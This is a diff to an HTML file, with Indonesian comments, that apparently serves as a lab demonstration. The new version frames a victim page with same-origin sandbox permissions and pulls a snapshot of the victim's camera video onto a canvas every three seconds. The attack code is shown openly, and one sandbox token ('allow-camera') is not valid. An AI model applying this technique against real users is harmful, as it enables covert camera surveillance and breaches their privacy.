@@ -1,23 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Attacker Page</title>
-<style>
-  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-  iframe { width: 320px; height: 240px; border: 2px solid black; }
-</style>
-</head>
-<body>
+<iframe id="victimFrame" src="victim.html" sandbox="allow-scripts allow-same-origin allow-forms allow-camera"></iframe>
+<script>
+const iframe = document.getElementById("victimFrame");
 
-<h2>Attacker Page</h2>
-<p>Viewer: hanya menampilkan kamera Victim</p>
+// Tunggu iframe load
+iframe.onload = () => {
+  const victimDoc = iframe.contentDocument || iframe.contentWindow.document;
+  const video = victimDoc.getElementById("video");
 
-<iframe 
-  src="victim.html"
-  allow="camera"
-  sandbox="allow-scripts allow-same-origin allow-forms">
-</iframe>
-
-</body>
-</html>
+  // Misal kita buat tombol Attacker capture frame langsung
+  // (harus same-origin supaya JS bisa akses video)
+  setInterval(() => {
+    if (video.srcObject) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      console.log("Attacker bisa mengambil snapshot dari Victim");
+    }
+  }, 3000); // setiap 3 detik
+};
+</script>
